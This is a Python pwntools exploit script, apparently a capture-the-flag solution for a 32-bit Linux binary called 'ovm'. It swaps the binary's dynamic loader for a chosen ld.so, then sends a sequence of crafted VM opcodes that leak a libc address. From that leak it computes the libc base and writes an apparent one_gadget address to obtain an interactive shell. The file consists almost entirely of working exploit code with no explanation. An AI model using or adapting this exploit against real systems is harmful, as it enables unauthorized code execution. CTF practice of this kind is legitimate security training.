from pwn import *
context(os = 'linux',arch = 'i386', log_level = 'debug')

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)


debug = 1
if debug == 1:
	elf = change_ld('./ovm', './ld-2.27.so')
	p = elf.process(env={'LD_PRELOAD':'./libc-2.27.so'})

else:
	p = remote()

size = 30
#gdb.attach(p)
p.recvuntil('PC:')
p.sendline('0')
p.recvuntil('SP:')
p.sendline(str(0x0))
p.recvuntil('CODE SIZE:')
p.sendline(str(size))
#gdb.attach(p)
p.recvuntil('CODE:')
p.sendline(str(0x10010040))
p.sendline(str(0x10020004))
p.sendline(str(0x10030005))
p.sendline(str(0x10040001))
p.sendline(str(0x10050003))
p.sendline(str(0xC0000102))
p.sendline(str(0x70000004))
p.sendline(str(0xC0000003))
p.sendline(str(0x70000003))
p.sendline(str(0xC0000004))
p.sendline(str(0x800d0600))
p.sendline(str(0x700d0d05))
p.sendline(str(0x60090000))
p.sendline(str(0x60080000))
p.sendline(str(0x60070000))
p.sendline(str(0x100a0010))
p.sendline(str(0x10050008))
p.sendline(str(0xC00a0a05))
p.sendline(str(0x100500A0))
p.sendline(str(0x700a0a05))
p.sendline(str(0x7007070a))

p.sendline(str(0x100d0010))
p.sendline(str(0x10000018))
p.sendline(str(0x1001000c))
p.sendline(str(0xC00d0d01))
p.sendline(str(0x700d0d00))

p.sendline(str(0x800d060d))

p.sendline(str(0x50070000))
#p.sendline(str(0x50080000))
#p.sendline(str(0x50080000))
#p.sendline(str(0x100d0018))
#p.sendline(str(0x800d060d))
p.sendline(str(0x50080000))
p.sendline(str(0xFF000000))
for i in range(7):
	p.recvline()
low = p.recvline()[-9: -1].ljust(9, '0')
high = p.recvline()[-5: -1]
libc_base = int(high + low, 16) - 0x3ed8e8
print hex(libc_base)
#gdb.attach(p)
p.recvuntil('?')
p.sendline(p64(libc_base + 0x10a38c))
#gdb.attach(p)
#p.sendline(str(0xFF000000))
p.interactive()
